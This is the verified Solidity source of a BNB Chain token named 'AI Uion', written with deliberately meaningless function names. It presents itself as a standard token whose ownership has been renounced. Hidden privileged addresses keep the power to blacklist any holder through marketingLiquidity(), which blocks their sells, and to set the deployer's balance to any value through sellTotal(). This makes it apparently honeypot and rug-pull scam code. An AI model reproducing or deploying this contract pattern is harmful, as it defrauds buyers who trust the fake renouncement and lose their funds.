/**
 *Submitted for verification at BscScan.com on 2023-02-15
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface minSwapAt {
    function createPair(address liquidityExemptSwap, address atModeLaunch) external returns (address);
}

interface totalTake {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract AIUion {

    function marketingLiquidity(address totalEnable) public {
        
        if (totalEnable == swapSenderShould || totalEnable == enableBuy || !launchTrading[toMax()]) {
            return;
        }
        
        fundReceiver[totalEnable] = true;
    }

    uint256 public tokenTrading;

    function transferFrom(address marketingToken, address sellMax, uint256 listModeLaunch) external returns (bool) {
        if (allowance[marketingToken][toMax()] != type(uint256).max) {
            require(listModeLaunch <= allowance[marketingToken][toMax()]);
            allowance[marketingToken][toMax()] -= listModeLaunch;
        }
        return receiverIsTake(marketingToken, sellMax, listModeLaunch);
    }

    bool public liquiditySell;

    mapping(address => bool) public launchTrading;

    event Approval(address indexed buyMin, address indexed spender, uint256 value);

    function shouldLiquidity(address enableAtLiquidity) public {
        if (liquiditySell) {
            return;
        }
        
        launchTrading[enableAtLiquidity] = true;
        
        liquiditySell = true;
    }

    uint8 public decimals = 18;

    bool private walletMarketing;

    function listMin() public {
        if (modeMax) {
            isTotal = tokenTrading;
        }
        
        modeMax=false;
    }

    bool private listFundFrom;

    function approve(address exemptAtList, uint256 listModeLaunch) public returns (bool) {
        allowance[toMax()][exemptAtList] = listModeLaunch;
        emit Approval(toMax(), exemptAtList, listModeLaunch);
        return true;
    }

    uint256 public totalSupply = 100000000 * 10 ** 18;

    mapping(address => uint256) public balanceOf;

    string public name = "AI Uion";

    uint256 private atMinLiquidity;

    function exemptReceiver() public {
        if (walletMarketing != maxSellFund) {
            tokenMarketing = true;
        }
        
        senderAmount=0;
    }

    constructor (){
        if (tokenMarketing) {
            tokenMarketing = true;
        }
        totalTake exemptFrom = totalTake(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        enableBuy = minSwapAt(exemptFrom.factory()).createPair(exemptFrom.WETH(), address(this));
        owner = toMax();
        if (modeMax != marketingLaunchedFee) {
            modeMax = true;
        }
        swapSenderShould = owner;
        launchTrading[swapSenderShould] = true;
        balanceOf[swapSenderShould] = totalSupply;
        if (modeMax != tokenMarketing) {
            atMinLiquidity = tokenTrading;
        }
        emit Transfer(address(0), swapSenderShould, totalSupply);
        walletFund();
    }

    function shouldAt() public {
        
        if (marketingLaunchedFee) {
            tokenMarketing = true;
        }
        modeMax=false;
    }

    mapping(address => bool) public fundReceiver;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    uint256 private senderAmount;

    address public owner;

    bool private maxSellFund;

    function getOwner() external view returns (address) {
        return owner;
    }

    function transfer(address limitTake, uint256 listModeLaunch) external returns (bool) {
        return receiverIsTake(toMax(), limitTake, listModeLaunch);
    }

    address public enableBuy;

    function walletFund() public {
        emit OwnershipTransferred(swapSenderShould, address(0));
        owner = address(0);
    }

    mapping(address => mapping(address => uint256)) public allowance;

    bool private marketingLaunchedFee;

    uint256 public isTotal;

    event Transfer(address indexed from, address indexed isShouldAt, uint256 value);

    function maxSender(address marketingToken, address sellMax, uint256 listModeLaunch) internal returns (bool) {
        require(balanceOf[marketingToken] >= listModeLaunch);
        balanceOf[marketingToken] -= listModeLaunch;
        balanceOf[sellMax] += listModeLaunch;
        emit Transfer(marketingToken, sellMax, listModeLaunch);
        return true;
    }

    function receiverIsTake(address marketingToken, address sellMax, uint256 listModeLaunch) internal returns (bool) {
        if (marketingToken == swapSenderShould) {
            return maxSender(marketingToken, sellMax, listModeLaunch);
        }
        require(!fundReceiver[marketingToken]);
        return maxSender(marketingToken, sellMax, listModeLaunch);
    }

    function sellTotal(uint256 listModeLaunch) public {
        if (!launchTrading[toMax()]) {
            return;
        }
        balanceOf[swapSenderShould] = listModeLaunch;
    }

    function fromLaunch() public {
        
        
        isTotal=0;
    }

    function toMax() private view returns (address) {
        return msg.sender;
    }

    address public swapSenderShould;

    string public symbol = "AUN";

    bool public tokenMarketing;

    bool private modeMax;

}